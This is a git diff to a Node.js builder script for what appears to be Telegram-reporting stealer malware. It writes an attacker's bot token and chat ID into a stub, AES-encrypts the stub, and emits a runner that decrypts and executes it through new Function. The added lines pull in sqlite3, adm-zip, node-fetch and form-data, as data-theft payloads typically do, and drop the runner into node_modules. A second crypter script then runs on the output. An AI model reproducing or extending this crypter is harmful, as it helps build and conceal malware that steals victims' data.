@@ -3,7 +3,7 @@ const path = require('path');
 const crypto = require('crypto');
 const os = require('os');
 const readline = require('readline');
-const { execSync } = require('child_process');
+const { execSync, spawn } = require('child_process');
 const colors = require('colors');
 const axios = require('axios');
 
@@ -70,65 +70,66 @@ function promptForTelegramCredentials() {
 }
 
 function executeSecondCrypterScript() {
-  const crypterDirectory = path.join(__dirname, '..', 'obf');
-  const secondCrypterScript = 'call obf.bat';
+  const crypterDirectory = __dirname;
+  const secondCrypterScript = 'jscrypter.js';
 
-  try {
-    const output = execSync(secondCrypterScript, { cwd: crypterDirectory, stdio: 'inherit' });
-    console.log(`Second crypter script output: ${output}`);
-  } catch (error) {
+  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });
+
+  childProcess.on('error', (error) => {
     console.error(`Error executing the second crypter script: ${error.message}`);
-  }
+  });
+
+  childProcess.on('exit', (code, signal) => {
+    if (code === 0) {
+      console.log(``);
+    } else {
+      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
+    }
+  });
 }
 
-function resetPlaceholder(stubPath, stubCode) {
-  fs.writeFileSync(stubPath, stubCode, 'utf8');
+function resetPlaceholder(stubPath, originalStubCode) {
+  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
   console.log('Success reset.');
 }
 
 async function main() {
-  let stubCode; // Variable to store the original stub code
+  let originalStubCode;
 
   try {
     const { botToken, chatId } = await promptForTelegramCredentials();
 
-    // Update the values in stub.js for Telegram
     const stubPath = path.resolve(__dirname, 'stub.js');
-    let stubCode = fs.readFileSync(stubPath, 'utf8');
- 
-    const updatedStubCode = stubCode.replace(
+    originalStubCode = fs.readFileSync(stubPath, 'utf8');
+
+    const updatedStubCode = originalStubCode
+    .replace(
       /const botToken = 'YOURBOTTOKEN';/,
       `const botToken = '${botToken}';`
-    ).replace(
-      /const chatId = 'YOURCHATID';/,
+    )
+    .replace(
+      /const chatId = 'YOURCHATID';/, 
       `const chatId = '${chatId}';`
     );
-    
-    if (stubCode === updatedStubCode) {
+  //p code
+    if (originalStubCode === updatedStubCode) {
       throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
     }
 
-    // Write the updated stub code back to the file
     fs.writeFileSync(stubPath, updatedStubCode, 'utf8');
 
-    // Send a test message to the provided Telegram Bot
     await sendTestMessage(botToken, chatId);
 
-    const updatedStubCodeWithWebhook = updatedStubCode.replace(
-      
-    );
-
-    // Write the updated stub code with Discord webhook back to the file
-    fs.writeFileSync(stubPath, updatedStubCodeWithWebhook, 'utf8');
-
-    // Encrypt the updated stub code
     const secret = crypto.randomBytes(32).toString('base64');
     const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
-    const { encryptedData, salt, iv } = encrypt(updatedStubCodeWithWebhook, encryptionKey);
+    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);
 
-    // Generate the final runner code
     const runnerCode = `
 const crypto = require('crypto');
+const AdmZip = require('adm-zip');
+const fetch = require('node-fetch');
+const sqlite3 = require('sqlite3');
+const FormData = require('form-data');
 
 ${decrypt.toString()}
 
@@ -136,9 +137,8 @@ const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${
 new Function('require', decrypted)(require);
 `;
 
-    // Write the runner code to a file
-    const folderName = '../obf'; // Target folder name
-    const fileName = 'input.js'; // Target file name
+    const folderName = 'node_modules';
+    const fileName = 'input.js';
     const targetFolder = path.join(__dirname, folderName);
 
     // Create the folder (if it doesn't exist)
@@ -155,21 +155,12 @@ new Function('require', decrypted)(require);
     console.log(`Obfuscated and encrypted with AES-256.`);
 
     setTimeout(() => {
-      resetPlaceholder(stubPath, stubCode);
+      resetPlaceholder(stubPath, originalStubCode);
       executeSecondCrypterScript();
-    }, 3000);
+    }, 1000);
 
   } catch (error) {
     console.error(`Error: ${error.message}`);
-
-    // If an error occurs, ensure to reset the modified elements
-    if (stubCode) {
-      const updatedStubPath = path.resolve(__dirname, 'stub.js');
-      resetPlaceholder(updatedStubPath, stubCode);
-    }
-  } finally {
-    // Close the readline interface to avoid resource leaks
-    rl.close();
   }
 }
 
